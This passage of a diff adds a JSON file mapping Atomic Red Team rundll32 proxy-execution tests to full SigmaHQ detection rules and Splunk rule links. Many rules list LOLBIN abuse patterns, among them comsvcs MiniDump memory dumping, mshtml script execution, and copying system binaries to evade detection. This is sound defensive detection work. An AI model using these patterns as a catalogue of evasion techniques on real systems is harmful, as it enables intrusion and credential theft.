+                        "remote_content": "title: Potentially Suspicious Rundll32 Activity\nid: e593cf51-88db-4ee1-b920-37e89012a3c9\nstatus: test\ndescription: Detects suspicious execution of rundll32, with specific calls to some DLLs with known LOLBIN functionalities\nreferences:\n    - http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/\n    - https://twitter.com/Hexacorn/status/885258886428725250\n    - https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52\n    - https://twitter.com/nas_bench/status/1433344116071583746 # dfshim.dll,ShOpenVerbShortcut\n    - https://twitter.com/eral4m/status/1479106975967240209 # scrobj.dll,GenerateTypeLib\n    - https://twitter.com/eral4m/status/1479080793003671557 # shimgvw.dll,ImageView_Fullscreen\nauthor: juju4, Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-01-16\nmodified: 2023-05-17\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - CommandLine|contains|all:\n              - 'javascript:'\n              - '.RegisterXLL'\n        - CommandLine|contains|all:\n              - 'url.dll'\n              - 'OpenURL'\n        - CommandLine|contains|all:\n              - 'url.dll'\n              - 'OpenURLA'\n        - CommandLine|contains|all:\n              - 'url.dll'\n              - 'FileProtocolHandler'\n        - CommandLine|contains|all:\n              - 'zipfldr.dll'\n              - 'RouteTheCall'\n        - CommandLine|contains|all:\n              - 'shell32.dll'\n              - 'Control_RunDLL'\n        - CommandLine|contains|all:\n              - 'shell32.dll'\n              - 'ShellExec_RunDLL'\n        - CommandLine|contains|all:\n              - 'mshtml.dll'\n              - 'PrintHTML'\n        - CommandLine|contains|all:\n              - 'advpack.dll'\n              - 'LaunchINFSection'\n        - CommandLine|contains|all:\n              - 'advpack.dll'\n              - 'RegisterOCX'\n        - CommandLine|contains|all:\n              - 'ieadvpack.dll'\n              - 'LaunchINFSection'\n        - CommandLine|contains|all:\n              - 'ieadvpack.dll'\n              - 'RegisterOCX'\n        - CommandLine|contains|all:\n              - 'ieframe.dll'\n              - 'OpenURL'\n        - CommandLine|contains|all:\n              - 'shdocvw.dll'\n              - 'OpenURL'\n        - CommandLine|contains|all:\n              - 'syssetup.dll'\n              - 'SetupInfObjectInstallAction'\n        - CommandLine|contains|all:\n              - 'setupapi.dll'\n              - 'InstallHinfSection'\n        - CommandLine|contains|all:\n              - 'pcwutl.dll'\n              - 'LaunchApplication'\n        - CommandLine|contains|all:\n              - 'dfshim.dll'\n              - 'ShOpenVerbApplication'\n        - CommandLine|contains|all:\n              - 'dfshim.dll'\n              - 'ShOpenVerbShortcut'\n        - CommandLine|contains|all:\n              - 'scrobj.dll'\n              - 'GenerateTypeLib'\n              - 'http'\n        - CommandLine|contains|all:\n              - 'shimgvw.dll'\n              - 'ImageView_Fullscreen'\n              - 'http'\n        - CommandLine|contains|all:\n              - 'comsvcs.dll'\n              - 'MiniDump'\n    filter_main_screensaver:\n        CommandLine|contains: 'shell32.dll,Control_RunDLL desk.cpl,screensaver,@screensaver'\n    filter_main_parent_cpl:  # Settings\n        ParentImage: 'C:\\Windows\\System32\\control.exe'\n        ParentCommandLine|contains: '.cpl'\n        CommandLine|contains|all:\n            - 'Shell32.dll'\n            - 'Control_RunDLL'\n            - '.cpl'\n    filter_main_startmenu:\n        ParentImage: 'C:\\Windows\\System32\\control.exe'\n        CommandLine|startswith: '\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \"C:\\Windows\\System32\\'\n        CommandLine|endswith: '.cpl\",'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Detect Rundll32 Application Control Bypass - advpack",
+                        "rule_link": "https://research.splunk.com/endpoint/4aefadfe-9abd-4bf8-b3fd-867e9ef95bf8/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1218.011",
+                "atomic_attack_guid": "32d1cf1b-cbc2-4c09-8d05-07ec5c83a821",
+                "atomic_attack_name": "Rundll32 execute VBscript command using Ordinal number",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Wscript Shell Run In CommandLine",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_mshta_inline_vbscript.yml",
+                        "remote_content": "title: Wscript Shell Run In CommandLine\nid: 2c28c248-7f50-417a-9186-a85b223010ee\nstatus: test\ndescription: Detects the presence of the keywords \"Wscript\", \"Shell\" and \"Run\" in the command, which could indicate a suspicious activity\nreferences:\n    - https://web.archive.org/web/20220830122045/http://blog.talosintelligence.com/2022/08/modernloader-delivers-multiple-stealers.html\n    - https://blog.talosintelligence.com/modernloader-delivers-multiple-stealers-cryptominers-and-rats/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-31\nmodified: 2023-05-15\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'Wscript.'\n            - '.Shell'\n            - '.Run'\n    condition: selection\nfalsepositives:\n    - Inline scripting can be used by some rare third party applications or administrators. Investigate and apply additional filters accordingly\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "DLL Call by Ordinal Via Rundll32.EXE",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules-threat-hunting/windows/process_creation/proc_creation_win_rundll32_by_ordinal.yml",
+                        "remote_content": "title: DLL Call by Ordinal Via Rundll32.EXE\nid: e79a9e79-eb72-4e78-a628-0e7e8f59e89c\nstatus: stable\ndescription: Detects calls of DLLs exports by ordinal numbers via rundll32.dll.\nreferences:\n    - https://web.archive.org/web/20200530031906/https://techtalk.pcmatic.com/2017/11/30/running-dll-files-malware-analysis/\n    - https://github.com/Neo23x0/DLLRunner\n    - https://twitter.com/cyb3rops/status/1186631731543236608\n    - https://www.welivesecurity.com/2022/03/01/isaacwiper-hermeticwizard-wiper-worm-targeting-ukraine/\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-10-22\nmodified: 2024-07-16\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\n    - detection.threat-hunting\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains:\n            - ',#'\n            - ', #'\n            - '.dll #'  # Sysmon removes , in its log\n            - '.ocx #'  # HermeticWizard\n    filter_optional_edge:\n        CommandLine|contains|all:\n            - 'EDGEHTML.dll'\n            - '#141'\n    filter_optional_vsbuild_dll:\n        ParentImage|contains:\n            - '\\Msbuild\\Current\\Bin\\'\n            - '\\VC\\Tools\\MSVC\\'\n            - '\\Tracker.exe'\n        CommandLine|contains:\n            - '\\FileTracker32.dll,#1'\n            - '\\FileTracker32.dll\",#1'\n            - '\\FileTracker64.dll,#1'\n            - '\\FileTracker64.dll\",#1'\n    condition: all of selection_* and not 1 of filter_optional_*\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment.\n    - Windows control panel elements have been identified as source (mmc).\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Mshtml.DLL RunHTMLApplication Suspicious Usage",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_mshtml_runhtmlapplication.yml",
+                        "remote_content": "title: Mshtml.DLL RunHTMLApplication Suspicious Usage\nid: 4782eb5a-a513-4523-a0ac-f3082b26ac5c\nrelated:\n    - id: 9f06447a-a33a-4cbe-a94f-a3f43184a7a3\n      type: obsolete\n    - id: 73fcad2e-ff14-4c38-b11d-4172c8ac86c7\n      type: obsolete\nstatus: test\ndescription: |\n    Detects execution of commands that leverage the \"mshtml.dll\" RunHTMLApplication export to run arbitrary code via different protocol handlers (vbscript, javascript, file, http...)\nreferences:\n    - https://twitter.com/n1nj4sec/status/1421190238081277959\n    - https://hyp3rlinx.altervista.org/advisories/MICROSOFT_WINDOWS_DEFENDER_TROJAN.WIN32.POWESSERE.G_MITIGATION_BYPASS_PART2.txt\n    - http://hyp3rlinx.altervista.org/advisories/MICROSOFT_WINDOWS_DEFENDER_DETECTION_BYPASS.txt\nauthor: Nasreddine Bencherchali (Nextron Systems),  Florian Roth (Nextron Systems), Josh Nickels, frack113, Zaw Min Htun (ZETA)\ndate: 2022-08-14\nmodified: 2024-02-23\ntags:\n    - attack.defense-evasion\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\..\\'\n            - 'mshtml'\n        CommandLine|contains:\n            - '#135'\n            - 'RunHTMLApplication'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Rundll32 Execution With Uncommon DLL Extension",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_uncommon_dll_extension.yml",
+                        "remote_content": "title: Rundll32 Execution With Uncommon DLL Extension\nid: c3a99af4-35a9-4668-879e-c09aeb4f2bdf\nstatus: test\ndescription: Detects the execution of rundll32 with a command line that doesn't contain a common extension\nreferences:\n    - https://twitter.com/mrd0x/status/1481630810495139841?s=12\nauthor: Tim Shelton, Florian Roth (Nextron Systems), Yassine Oukessou\ndate: 2022-01-13\nmodified: 2024-04-04\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    filter_main_null:\n        CommandLine: null\n    filter_main_empty:\n        CommandLine: ''\n    filter_main_known_extension:\n        - CommandLine|contains:\n              # Note: This aims to cover: single and double quotes in addition to spaces and comma \",\" usage.\n              - '.cpl '\n              - '.cpl,'\n              - '.cpl\"'\n              - \".cpl'\"\n              - '.dll '\n              - '.dll,'\n              - '.dll\"'\n              - \".dll'\"\n              - '.inf '\n              - '.inf,'\n              - '.inf\"'\n              - \".inf'\"\n        - CommandLine|endswith:\n              # Note: This aims to cover: single and double quotes in addition to spaces and comma \",\" usage.\n              - '.cpl'\n              - '.dll'\n              - '.inf'\n    filter_main_localserver:\n        CommandLine|contains: ' -localserver '\n    filter_main_zzzzInvokeManagedCustomActionOutOfProc:\n        ParentImage|endswith: '\\msiexec.exe'\n        CommandLine|contains|all:\n            - ':\\Windows\\Installer\\'\n            - '.tmp'\n            - 'zzzzInvokeManagedCustomActionOutOfProc'\n    filter_optional_EdgeUpdate:\n        ParentCommandLine|contains|all:\n            - ':\\Users\\'\n            - '\\AppData\\Local\\Microsoft\\EdgeUpdate\\Install\\{'\n            - '\\EDGEMITMP_'\n            - '.tmp\\setup.exe'\n            - '--install-archive='\n            - '--previous-version='\n            - '--msedgewebview --verbose-logging --do-not-launch-msedge --user-level'\n    condition: selection and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "RunDLL Loading DLL By Ordinal",
+                        "rule_link": "https://research.splunk.com/endpoint/6c135f8d-5e60-454e-80b7-c56eed739833/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1218.011",
+                "atomic_attack_guid": "8a7f56ee-10e7-444c-a139-0109438288eb",
+                "atomic_attack_name": "Rundll32 execute payload by calling RouteTheCall",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Potentially Suspicious Rundll32 Activity",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml",
+                        "remote_content": "title: Potentially Suspicious Rundll32 Activity\nid: e593cf51-88db-4ee1-b920-37e89012a3c9\nstatus: test\ndescription: Detects suspicious execution of rundll32, with specific calls to some DLLs with known LOLBIN functionalities\nreferences:\n    - http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/\n    - https://twitter.com/Hexacorn/status/885258886428725250\n    - https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52\n    - https://twitter.com/nas_bench/status/1433344116071583746 # dfshim.dll,ShOpenVerbShortcut\n    - https://twitter.com/eral4m/status/1479106975967240209 # scrobj.dll,GenerateTypeLib\n    - https://twitter.com/eral4m/status/1479080793003671557 # shimgvw.dll,ImageView_Fullscreen\nauthor: juju4, Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-01-16\nmodified: 2023-05-17\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - CommandLine|contains|all:\n              - 'javascript:'\n              - '.RegisterXLL'\n        - CommandLine|contains|all:\n              - 'url.dll'\n              - 'OpenURL'\n        - CommandLine|contains|all:\n              - 'url.dll'\n              - 'OpenURLA'\n        - CommandLine|contains|all:\n              - 'url.dll'\n              - 'FileProtocolHandler'\n        - CommandLine|contains|all:\n              - 'zipfldr.dll'\n              - 'RouteTheCall'\n        - CommandLine|contains|all:\n              - 'shell32.dll'\n              - 'Control_RunDLL'\n        - CommandLine|contains|all:\n              - 'shell32.dll'\n              - 'ShellExec_RunDLL'\n        - CommandLine|contains|all:\n              - 'mshtml.dll'\n              - 'PrintHTML'\n        - CommandLine|contains|all:\n              - 'advpack.dll'\n              - 'LaunchINFSection'\n        - CommandLine|contains|all:\n              - 'advpack.dll'\n              - 'RegisterOCX'\n        - CommandLine|contains|all:\n              - 'ieadvpack.dll'\n              - 'LaunchINFSection'\n        - CommandLine|contains|all:\n              - 'ieadvpack.dll'\n              - 'RegisterOCX'\n        - CommandLine|contains|all:\n              - 'ieframe.dll'\n              - 'OpenURL'\n        - CommandLine|contains|all:\n              - 'shdocvw.dll'\n              - 'OpenURL'\n        - CommandLine|contains|all:\n              - 'syssetup.dll'\n              - 'SetupInfObjectInstallAction'\n        - CommandLine|contains|all:\n              - 'setupapi.dll'\n              - 'InstallHinfSection'\n        - CommandLine|contains|all:\n              - 'pcwutl.dll'\n              - 'LaunchApplication'\n        - CommandLine|contains|all:\n              - 'dfshim.dll'\n              - 'ShOpenVerbApplication'\n        - CommandLine|contains|all:\n              - 'dfshim.dll'\n              - 'ShOpenVerbShortcut'\n        - CommandLine|contains|all:\n              - 'scrobj.dll'\n              - 'GenerateTypeLib'\n              - 'http'\n        - CommandLine|contains|all:\n              - 'shimgvw.dll'\n              - 'ImageView_Fullscreen'\n              - 'http'\n        - CommandLine|contains|all:\n              - 'comsvcs.dll'\n              - 'MiniDump'\n    filter_main_screensaver:\n        CommandLine|contains: 'shell32.dll,Control_RunDLL desk.cpl,screensaver,@screensaver'\n    filter_main_parent_cpl:  # Settings\n        ParentImage: 'C:\\Windows\\System32\\control.exe'\n        ParentCommandLine|contains: '.cpl'\n        CommandLine|contains|all:\n            - 'Shell32.dll'\n            - 'Control_RunDLL'\n            - '.cpl'\n    filter_main_startmenu:\n        ParentImage: 'C:\\Windows\\System32\\control.exe'\n        CommandLine|startswith: '\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \"C:\\Windows\\System32\\'\n        CommandLine|endswith: '.cpl\",'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Potentially Suspicious PowerShell Child Processes",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules-threat-hunting/windows/process_creation/proc_creation_win_powershell_susp_child_processes.yml",
+                        "remote_content": "title: Potentially Suspicious PowerShell Child Processes\nid: e4b6d2a7-d8a4-4f19-acbd-943c16d90647\nstatus: test\ndescription: |\n    Detects potentially suspicious child processes spawned by PowerShell.\n    Use this rule to hunt for potential anomalies initiating from PowerShell scripts and commands.\nreferences:\n    - https://twitter.com/ankit_anubhav/status/1518835408502620162\nauthor: Florian Roth (Nextron Systems), Tim Shelton\ndate: 2022-04-26\nmodified: 2024-07-16\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - detection.threat-hunting\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\powershell_ise.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        Image|endswith:\n            - '\\bash.exe'\n            - '\\bitsadmin.exe'\n            - '\\certutil.exe'\n            - '\\cscript.exe'\n            - '\\forfiles.exe'\n            - '\\hh.exe'\n            - '\\mshta.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\schtasks.exe'\n            - '\\scrcons.exe'\n            - '\\scriptrunner.exe'\n            - '\\sh.exe'\n            - '\\wmic.exe'\n            - '\\wscript.exe'\n    filter_optional_amazon:\n        ParentCommandLine|contains: '\\Program Files\\Amazon\\WorkspacesConfig\\Scripts\\'  # AWS Workspaces\n        CommandLine|contains: '\\Program Files\\Amazon\\WorkspacesConfig\\Scripts\\'  # AWS Workspaces\n    filter_main_certutil_verify_store:\n        Image|endswith: '\\certutil.exe'\n        CommandLine|contains: '-verifystore '\n    filter_main_wmic:\n        Image|endswith: '\\wmic.exe'\n        CommandLine|contains:\n            - 'qfe list'\n            - 'diskdrive '\n            - 'csproduct '\n            - 'computersystem '\n            - ' os '\n            - ''\n    condition: selection and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - False positives are to be expected from PowerShell scripts that might make use of additional binaries such as \"mshta\", \"bitsadmin\", etc. Apply additional filters for those scripts.\nlevel: medium\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1218.011",
+                "atomic_attack_guid": "f3ad3c5b-1db1-45c1-81bf-d3370ebab6c8",
+                "atomic_attack_name": "Rundll32 execute command via FileProtocolHandler",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Potentially Suspicious Rundll32 Activity",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml",
+                        "remote_content": "title: Potentially Suspicious Rundll32 Activity\nid: e593cf51-88db-4ee1-b920-37e89012a3c9\nstatus: test\ndescription: Detects suspicious execution of rundll32, with specific calls to some DLLs with known LOLBIN functionalities\nreferences:\n    - http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/\n    - https://twitter.com/Hexacorn/status/885258886428725250\n    - https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52\n    - https://twitter.com/nas_bench/status/1433344116071583746 # dfshim.dll,ShOpenVerbShortcut\n    - https://twitter.com/eral4m/status/1479106975967240209 # scrobj.dll,GenerateTypeLib\n    - https://twitter.com/eral4m/status/1479080793003671557 # shimgvw.dll,ImageView_Fullscreen\nauthor: juju4, Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-01-16\nmodified: 2023-05-17\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - CommandLine|contains|all:\n              - 'javascript:'\n              - '.RegisterXLL'\n        - CommandLine|contains|all:\n              - 'url.dll'\n              - 'OpenURL'\n        - CommandLine|contains|all:\n              - 'url.dll'\n              - 'OpenURLA'\n        - CommandLine|contains|all:\n              - 'url.dll'\n              - 'FileProtocolHandler'\n        - CommandLine|contains|all:\n              - 'zipfldr.dll'\n              - 'RouteTheCall'\n        - CommandLine|contains|all:\n              - 'shell32.dll'\n              - 'Control_RunDLL'\n        - CommandLine|contains|all:\n              - 'shell32.dll'\n              - 'ShellExec_RunDLL'\n        - CommandLine|contains|all:\n              - 'mshtml.dll'\n              - 'PrintHTML'\n        - CommandLine|contains|all:\n              - 'advpack.dll'\n              - 'LaunchINFSection'\n        - CommandLine|contains|all:\n              - 'advpack.dll'\n              - 'RegisterOCX'\n        - CommandLine|contains|all:\n              - 'ieadvpack.dll'\n              - 'LaunchINFSection'\n        - CommandLine|contains|all:\n              - 'ieadvpack.dll'\n              - 'RegisterOCX'\n        - CommandLine|contains|all:\n              - 'ieframe.dll'\n              - 'OpenURL'\n        - CommandLine|contains|all:\n              - 'shdocvw.dll'\n              - 'OpenURL'\n        - CommandLine|contains|all:\n              - 'syssetup.dll'\n              - 'SetupInfObjectInstallAction'\n        - CommandLine|contains|all:\n              - 'setupapi.dll'\n              - 'InstallHinfSection'\n        - CommandLine|contains|all:\n              - 'pcwutl.dll'\n              - 'LaunchApplication'\n        - CommandLine|contains|all:\n              - 'dfshim.dll'\n              - 'ShOpenVerbApplication'\n        - CommandLine|contains|all:\n              - 'dfshim.dll'\n              - 'ShOpenVerbShortcut'\n        - CommandLine|contains|all:\n              - 'scrobj.dll'\n              - 'GenerateTypeLib'\n              - 'http'\n        - CommandLine|contains|all:\n              - 'shimgvw.dll'\n              - 'ImageView_Fullscreen'\n              - 'http'\n        - CommandLine|contains|all:\n              - 'comsvcs.dll'\n              - 'MiniDump'\n    filter_main_screensaver:\n        CommandLine|contains: 'shell32.dll,Control_RunDLL desk.cpl,screensaver,@screensaver'\n    filter_main_parent_cpl:  # Settings\n        ParentImage: 'C:\\Windows\\System32\\control.exe'\n        ParentCommandLine|contains: '.cpl'\n        CommandLine|contains|all:\n            - 'Shell32.dll'\n            - 'Control_RunDLL'\n            - '.cpl'\n    filter_main_startmenu:\n        ParentImage: 'C:\\Windows\\System32\\control.exe'\n        CommandLine|startswith: '\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \"C:\\Windows\\System32\\'\n        CommandLine|endswith: '.cpl\",'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1218.011",
+                "atomic_attack_guid": "2d5029f0-ae20-446f-8811-e7511b58e8b6",
+                "atomic_attack_name": "Running DLL with .init extension and function",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Rundll32 Execution With Uncommon DLL Extension",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_uncommon_dll_extension.yml",
+                        "remote_content": "title: Rundll32 Execution With Uncommon DLL Extension\nid: c3a99af4-35a9-4668-879e-c09aeb4f2bdf\nstatus: test\ndescription: Detects the execution of rundll32 with a command line that doesn't contain a common extension\nreferences:\n    - https://twitter.com/mrd0x/status/1481630810495139841?s=12\nauthor: Tim Shelton, Florian Roth (Nextron Systems), Yassine Oukessou\ndate: 2022-01-13\nmodified: 2024-04-04\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    filter_main_null:\n        CommandLine: null\n    filter_main_empty:\n        CommandLine: ''\n    filter_main_known_extension:\n        - CommandLine|contains:\n              # Note: This aims to cover: single and double quotes in addition to spaces and comma \",\" usage.\n              - '.cpl '\n              - '.cpl,'\n              - '.cpl\"'\n              - \".cpl'\"\n              - '.dll '\n              - '.dll,'\n              - '.dll\"'\n              - \".dll'\"\n              - '.inf '\n              - '.inf,'\n              - '.inf\"'\n              - \".inf'\"\n        - CommandLine|endswith:\n              # Note: This aims to cover: single and double quotes in addition to spaces and comma \",\" usage.\n              - '.cpl'\n              - '.dll'\n              - '.inf'\n    filter_main_localserver:\n        CommandLine|contains: ' -localserver '\n    filter_main_zzzzInvokeManagedCustomActionOutOfProc:\n        ParentImage|endswith: '\\msiexec.exe'\n        CommandLine|contains|all:\n            - ':\\Windows\\Installer\\'\n            - '.tmp'\n            - 'zzzzInvokeManagedCustomActionOutOfProc'\n    filter_optional_EdgeUpdate:\n        ParentCommandLine|contains|all:\n            - ':\\Users\\'\n            - '\\AppData\\Local\\Microsoft\\EdgeUpdate\\Install\\{'\n            - '\\EDGEMITMP_'\n            - '.tmp\\setup.exe'\n            - '--install-archive='\n            - '--previous-version='\n            - '--msedgewebview --verbose-logging --do-not-launch-msedge --user-level'\n    condition: selection and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1218.011",
+                "atomic_attack_guid": "83a95136-a496-423c-81d3-1c6750133917",
+                "atomic_attack_name": "Rundll32 with desk.cpl",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "LOL-Binary Copied From System Directory",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_copy_system_dir_lolbin.yml",
+                        "remote_content": "title: LOL-Binary Copied From System Directory\nid: f5d19838-41b5-476c-98d8-ba8af4929ee2\nrelated:\n    - id: fff9d2b7-e11c-4a69-93d3-40ef66189767\n      type: derived\nstatus: test\ndescription: |\n    Detects a suspicious copy operation that tries to copy a known LOLBIN from system (System32, SysWOW64, WinSxS) directories to another on disk in order to bypass detections based on locations.\nreferences:\n    - https://www.hybrid-analysis.com/sample/8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd?environmentId=120\n    - https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html\n    - https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-08-29\ntags:\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_tools_cmd:\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains: 'copy '\n    selection_tools_pwsh:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains:\n            - 'copy-item'\n            - ' copy '\n            - 'cpi '\n            - ' cp '\n    selection_tools_other:\n        - Image|endswith:\n              - '\\robocopy.exe'\n              - '\\xcopy.exe'\n        - OriginalFileName:\n              - 'robocopy.exe'\n              - 'XCOPY.EXE'\n    selection_target_path:\n        CommandLine|contains:\n            - '\\System32'\n            - '\\SysWOW64'\n            - '\\WinSxS'\n    selection_target_lolbin:\n        CommandLine|contains:\n            # Note: add more binaries to increase coverage\n            - '\\bitsadmin.exe'\n            - '\\calc.exe'\n            - '\\certutil.exe'\n            - '\\cmdl32.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\rundll32.exe'\n            - '\\wscript.exe'\n    condition: 1 of selection_tools_* and all of selection_target_*\nfalsepositives:\n    - Unknown\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Rundll32 InstallScreenSaver Execution",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_installscreensaver.yml",
+                        "remote_content": "title: Rundll32 InstallScreenSaver Execution\nid: 15bd98ea-55f4-4d37-b09a-e7caa0fa2221\nstatus: test\ndescription: An attacker may execute an application as a SCR File using rundll32.exe desk.cpl,InstallScreenSaver\nreferences:\n    - https://lolbas-project.github.io/lolbas/Libraries/Desk/\n    - https://github.com/redcanaryco/atomic-red-team/blob/0f229c0e42bfe7ca736a14023836d65baa941ed2/atomics/T1218.011/T1218.011.md#atomic-test-13---rundll32-with-deskcpl\nauthor: 'Christopher Peacock @securepeacock, SCYTHE @scythe_io, TactiKoolSec'\ndate: 2022-04-28\nmodified: 2023-02-09\ntags:\n    - attack.t1218.011\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains: 'InstallScreenSaver'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate installation of a new screensaver\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Suspicious Copy From or To System Directory",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_copy_system_dir.yml",
+                        "remote_content": "title: Suspicious Copy From or To System Directory\nid: fff9d2b7-e11c-4a69-93d3-40ef66189767\nrelated:\n    - id: 855bc8b5-2ae8-402e-a9ed-b889e6df1900\n      type: derived\nstatus: test\ndescription: |\n    Detects a suspicious copy operation that tries to copy a program from system (System32, SysWOW64, WinSxS) directories to another on disk.\n    Often used to move LOLBINs such as 'certutil' or 'desktopimgdownldr' to a different location with a different name in order to bypass detections based on locations.\nreferences:\n    - https://www.hybrid-analysis.com/sample/8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd?environmentId=120\n    - https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html\n    - https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/\nauthor: Florian Roth (Nextron Systems), Markus Neis, Tim Shelton (HAWK.IO), Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-07-03\nmodified: 2023-08-29\ntags:\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains: 'copy '\n    selection_pwsh:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains:\n            - 'copy-item'\n           